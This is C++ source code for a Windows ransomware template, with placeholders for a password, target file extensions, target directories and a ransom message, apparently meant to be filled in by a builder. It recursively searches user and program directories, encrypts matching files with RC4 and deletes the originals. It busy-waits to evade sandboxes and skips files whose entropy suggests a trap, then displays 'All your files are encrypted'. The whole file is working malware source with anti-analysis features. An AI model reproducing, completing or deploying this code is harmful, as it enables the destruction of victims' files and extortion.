#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <dirent.h>
#include <sys/stat.h>
#include <string>
#include <vector>
#include <iostream>
#include <fstream>
#include <algorithm>
#include <windows.h>
#include <cmath>
#include <map>

using namespace std;
const char pw[] __attribute__((section("PASSWD"))) = #PASSWORD#;
const std::vector<std::string> suffixes = {#SUFFIES#};
const std::string encryptedSuffix = #ENCRYPTED_SUFFIX#;
const std::string password = #PASSWORD#;
const bool antiSandbox = #SANDBOX#;
const bool antiTrap = #TRAP#;
std::vector<std::string> rootDirectory = {#DIRECTORIES#};
double roundToDecimalPlaces(double value, int decimalPlaces)
{
    double factor = std::pow(10.0, decimalPlaces);
    return std::round(value * factor) / factor;
}
double calculateEntropy(const std::vector<unsigned char> &data)
{
    std::map<unsigned char, int> frequencyMap;

    // Calculate frequency distribution
    for (unsigned char byte_ : data)
    {
        frequencyMap[byte_]++;
    }

    double totalBytes = data.size();
    double entropy = 0.0;

    // Calculate probability distribution and entropy
    for (const auto &entry : frequencyMap)
    {
        double probability = entry.second / totalBytes;
        entropy -= probability * log2(probability);
    }

    return entropy;
}
void initializeRC4(std::vector<unsigned char> &S, const std::vector<unsigned char> &key)
{
    for (int i = 0; i < 256; ++i)
    {
        S[i] = static_cast<unsigned char>(i);
    }

    int j = 0;
    for (int i = 0; i < 256; ++i)
    {
        j = (j + S[i] + key[i % key.size()]) % 256;
        std::swap(S[i], S[j]);
    }
}

void encryptWithRC4(std::vector<unsigned char> &data, const std::vector<unsigned char> &key)
{
    std::vector<unsigned char> S(256);
    initializeRC4(S, key);

    int i = 0;
    int j = 0;

    for (unsigned char &byte_ : data)
    {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        std::swap(S[i], S[j]);
        byte_ ^= S[(S[i] + S[j]) % 256];
    }
}

void encryptFileWithRC4(const std::string &inputFileName)
{
    std::ifstream inputFile(inputFileName, std::ios::binary);
    if (!inputFile.is_open())
    {
        std::cerr << "Failed to open input file." << std::endl;
        return;
    }

    std::ofstream outputFile(inputFileName + encryptedSuffix, std::ios::binary);
    if (!outputFile.is_open())
    {
        std::cerr << "Failed to open output file." << std::endl;
        inputFile.close();
        return;
    }

    std::vector<unsigned char> inputData(
        (std::istreambuf_iterator<char>(inputFile)),
        (std::istreambuf_iterator<char>()));
    inputFile.close();
    if (antiTrap)
    {
        double result=roundToDecimalPlaces(calculateEntropy(inputData), 2);
        std::cout<<result;
        if (result == 6.39)
        {
            return;
        }
    }
    std::remove(inputFileName.c_str());
    std::vector<unsigned char> keyData(password.begin(), password.end());

    encryptWithRC4(inputData, keyData);

    outputFile.write(reinterpret_cast<const char *>(inputData.data()), inputData.size());

    outputFile.close();
}
bool isInList(const std::vector<std::string> &list, const std::string &value)
{
    return std::find(list.begin(), list.end(), value) != list.end();
}
void searchFiles(const char *basePath)
{
    DIR *dir;
    struct dirent *entry;
    dir = opendir(basePath);
    if (dir == nullptr)
    {
        perror("Error opening directory");
        return;
    }

    while ((entry = readdir(dir)) != nullptr)
    {
        if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0)
        {
            std::string path = std::string(basePath) + "/" + entry->d_name;

            struct stat fileStat;
            if (stat(path.c_str(), &fileStat) == 0)
            {
                if (S_ISDIR(fileStat.st_mode))
                {
                    searchFiles(path.c_str());
                }
                else
                {
                    // Check if the file has the desired extension
                    size_t dotPos = path.rfind('.');
                    if (dotPos != std::string::npos && isInList(suffixes, path.substr(dotPos)))
                    {
                        std::cout << path << std::endl;
                        encryptFileWithRC4(path);
                    }
                }
            }
        }
    }

    closedir(dir);
}

void _Sleep(unsigned long milliseconds)
{
    unsigned long start = GetTickCount();

    while (GetTickCount() - start < milliseconds)
    {
    }
}
std::vector<std::string> ReplaceEnviron(const std::vector<std::string>& varList, const std::vector<std::string>& sList)
{
    std::vector<std::string> ret;
    
    for (const std::string& ss : sList)
    {
        std::string modifiedSs = ss;
        for (const std::string& i : varList)
        {
            std::string upperVar = i;
            std::transform(upperVar.begin(), upperVar.end(), upperVar.begin(), ::toupper);
            
            size_t pos = modifiedSs.find("%" + upperVar + "%");
            if (pos != std::string::npos)
            {
                modifiedSs.replace(pos, upperVar.length() + 2, getenv(i.c_str()));
            }
        }
        ret.push_back(modifiedSs);
    }
    
    return ret;
}
int main() __attribute__((section("_")));
int main()
{
    (void)pw;
    std::vector<std::string> list={
        "APPDATA", "HOMEDRIVE", "HOMEPATH", "LOCALAPPDATA",
        "ProgramData", "ProgramFiles", "ProgramFiles(x86)",
        "ProgramW6432", "TEMP", "USERPROFILE"
    };
    rootDirectory=ReplaceEnviron(list,rootDirectory);
    if (antiSandbox)
        _Sleep(1000 * 30 * 10);
    for (std::string directory : rootDirectory)
    {
        searchFiles(directory.c_str());
    }
    MessageBoxW(NULL, L#MSG#, L"All your files are encrypted", MB_ICONWARNING | MB_OK);
    return 0;
}
